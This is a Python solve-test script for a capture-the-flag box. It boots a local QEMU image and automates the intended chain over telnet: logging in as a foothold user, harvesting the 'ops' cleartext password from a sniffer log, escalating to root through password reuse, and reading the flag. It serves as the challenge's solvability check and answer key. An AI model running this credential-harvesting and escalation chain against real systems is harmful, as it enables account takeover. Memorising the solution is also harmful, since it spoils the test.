#!/usr/bin/env python3
"""Box 3 "the pivot" SOLVE TEST.  Walk the intended chain over telnet:

    telnet brian -> read the prior intruder's sunsniffer capture log -> harvest
    the operator `ops`'s cleartext FTP password -> su ops -> su root (password
    REUSE) -> read the off-disk flag.

Exits 0 only if uid=0 is reached via the harvested credential AND the real flag
(not the decoy) is recovered.  The gate for "Box 3 is solvable".
"""
import os, re, socket, subprocess, sys, time
import pexpect

QEMU   = os.environ.get("QEMU_BIN", "qemu-system-i386")
IMAGE  = os.environ["BOX_IMAGE_ABS"]
MACHINE= os.environ.get("BOX_MACHINE", "pc")
CPU    = os.environ.get("BOX_CPU", "pentium")
MEM    = os.environ.get("BOX_MEM_MB", "128")
TPORT  = os.environ.get("BOX_FWD_TELNET", "2323")
FPORT  = os.environ.get("BOX_FWD_FTP", "2121")
SPORT  = os.environ.get("BOX_FWD_SHELL", "5514")
FUSER  = os.environ.get("BOX_FOOTHOLD_USER", "brian")
FPASS  = os.environ.get("BOX_FOOTHOLD_PASS", "newriver")
OPSU   = os.environ.get("BOX_OPS_USER", "ops")
OPSP   = os.environ.get("BOX_OPS_PASS", "")          # owner copy, for a sanity check
SNIFF  = os.environ.get("BOX_SNIFFLOG", "/home/dono/.sunsniff.log")
LOOTD  = os.environ.get("BOX_LOOT_DIR", "/var/adm/.loot")
LOOTN  = os.environ.get("BOX_LOOT_NAME", "flag.txt")
EXPECT = os.environ.get("BOX_EXPECT_FLAG", "")
DECOY  = os.environ.get("BOX_FLAG_DECOY", "")
SERLOG = os.environ.get("BOX_SOLVE_SERIAL", "work/solve3-serial.log")
NO_BOOT= os.environ.get("BOX_NO_BOOT")

def log(m): print(f"[solve3] {m}", file=sys.stderr, flush=True)
def reap(): subprocess.run(["pkill","-9","-f",os.path.basename(IMAGE)],check=False)

def boot_box():
    reap(); time.sleep(1)
    fwd=(f"hostfwd=tcp:127.0.0.1:{TPORT}-:23,hostfwd=tcp:127.0.0.1:{FPORT}-:21,"
         f"hostfwd=tcp:127.0.0.1:{SPORT}-:513")
    keyf=os.environ.get("BOX_LUKS_KEYFILE_ABS","")
    secret, drive = [], f"file={IMAGE},format=qcow2,if=ide,index=0,media=disk"
    if keyf and os.path.exists(keyf):
        secret=["-object",f"secret,id=sec0,file={keyf}"]; drive+=",encrypt.key-secret=sec0"
        log("(booting LUKS-encrypted image with key)")
    cmd=[QEMU,"-machine",f"{MACHINE},graphics=off","-cpu",CPU,"-m",MEM,*secret,
         "-drive",drive,"-boot","c","-display","none","-serial",f"file:{SERLOG}",
         "-monitor","none","-no-reboot","-netdev",f"user,id=n0,restrict=on,{fwd}",
         "-device","ne2k_pci,netdev=n0"]
    log("booting box (host-only, telnet on 127.0.0.1:%s)"%TPORT)
    return subprocess.Popen(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

def wait_telnet(deadline):
    log("waiting for multiuser boot + telnetd ...")
    while time.time()<deadline:
        try: socket.create_connection(("127.0.0.1",int(TPORT)),timeout=3).close(); log("telnet port is open"); return True
        except OSError: time.sleep(5)
    return False

def harvest_ops_pass(text):
    """Pull the password following 'USER ops' in the sunsniffer capture."""
    lines=text.splitlines()
    for i,l in enumerate(lines):
        if re.search(r"\bUSER\s+%s\b"%re.escape(OPSU), l):
            for j in range(i+1, min(i+5, len(lines))):
                m=re.search(r"PASS\s+(\S+)", lines[j])
                if m: return m.group(1)
    return ""

def main():
    box=None if NO_BOOT else boot_box()
    if NO_BOOT: log("BOX_NO_BOOT: solving an already-running box on 127.0.0.1:%s"%TPORT)
    try:
        if not wait_telnet(time.time()+600):
            log("telnetd never came up — see %s"%SERLOG); return 1
        tn=None
        for attempt in range(16):
            time.sleep(10)
            tn=pexpect.spawn(f"telnet 127.0.0.1 {TPORT}",encoding="latin-1",timeout=60)
            tn.logfile_read=open(SERLOG.replace(".log","-telnet.log"),"w",encoding="latin-1")
            try: tn.expect(r"login:",timeout=30); break
            except (pexpect.TIMEOUT,pexpect.EOF):
                log(f"telnet attempt {attempt+1}: no login yet, retry"); tn=None
        if tn is None: log("no login prompt"); return 1

        # foothold
        tn.sendline(FUSER); tn.expect(r"[Pp]assword:",timeout=30); tn.sendline(FPASS)
        i=tn.expect([r"\$ ",r"% ",r"Login incorrect"],timeout=60)
        if i==2: log("FOOTHOLD FAILED"); return 2
        tn.sendline("stty -echo 2>/dev/null"); tn.expect([r"\$ ",r"% "],timeout=30)
        tn.sendline("PS1='BRIAN> '; export PS1"); tn.expect(r"BRIAN> ",timeout=30)
        log("foothold OK: logged in as %s"%FUSER)

        # enumerate cache + harvest the sniffed ops password
        tn.sendline(f"ls /home/dono 2>&1"); tn.expect(r"BRIAN> ",timeout=30)
        log("cache: %s"%" ".join(tn.before.split())[-100:])
        tn.sendline(f"cat {SNIFF} 2>&1"); tn.expect(r"BRIAN> ",timeout=30)
        opspass=harvest_ops_pass(tn.before)
        if not opspass:
            log("HARVEST FAILED: no '%s' password in %s"%(OPSU,SNIFF)); return 3
        log("harvested %s cleartext password from sniffer log: %s"%(OPSU,opspass))
        if OPSP and opspass!=OPSP: log("note: harvested %r != owner copy %r"%(opspass,OPSP))

        # escalate: su ops (sniffed) -> su root (reuse)
        tn.sendline(f"su {OPSU}")
        tn.expect(r"[Pp]assword:",timeout=30); tn.sendline(opspass); time.sleep(1)
        tn.sendline("id; echo OPSCHK_X"); tn.expect(r"OPSCHK_X",timeout=20)
        if ("uid=106" not in tn.before) and (OPSU not in tn.before):
            log("SU OPS FAILED: %r"%" ".join(tn.before.split())[-80:]); return 4
        log("su %s OK (harvested password works)"%OPSU)
        tn.sendline("su")
        tn.expect(r"[Pp]assword:",timeout=30); tn.sendline(opspass); time.sleep(1)
        # root's login shell is /bin/csh; switch to sh so the $?-sentinel helper works
        tn.sendline("/bin/sh"); time.sleep(1)
        tn.sendline("id; echo ROOTCHK_X"); tn.expect(r"ROOTCHK_X",timeout=20)
        if "uid=0" not in tn.before:
            log("SU ROOT FAILED (reuse?): %r"%" ".join(tn.before.split())[-80:]); return 5
        log("privesc OK: uid=0 via password REUSE (ops pw == root pw)")

        def root(cmd,tmo=120):
            tn.sendline(cmd+"; echo X_$?_X"); tn.expect(r"X_\d+_X",timeout=tmo); return tn.before

        # flag (gen-flag materialises at boot; retry like Box 1)
        flag=""
        for attempt in range(12):
            out=root(f"cat {LOOTD}/{LOOTN} 2>&1")
            f=""
            for line in out.splitlines():
                if "BU{" in line: f=line[line.index("BU{"):].split("}")[0]+"}"; break
            if f and f!=DECOY: flag=f; break
            log("attempt %d: flag not materialised yet..."%(attempt+1)); time.sleep(6)
        if not flag: log("FLAG FAILED: only decoy/none (gen-flag MFS?)"); return 6
        log("flag recovered: %s"%flag)
        if EXPECT and flag!=EXPECT: log("FLAG MISMATCH: got %s expected %s"%(flag,EXPECT)); return 7
        log("=== SOLVE OK: foothold -> sniff log -> harvest ops -> reuse -> root -> flag ===")
        print(flag); return 0
    except (pexpect.TIMEOUT,pexpect.EOF) as e:
        log("%s during solve — see %s"%(type(e).__name__,SERLOG)); return 1
    finally:
        if not NO_BOOT:
            reap()
            if box is not None and box.poll() is None: box.terminate()

if __name__=="__main__": sys.exit(main())
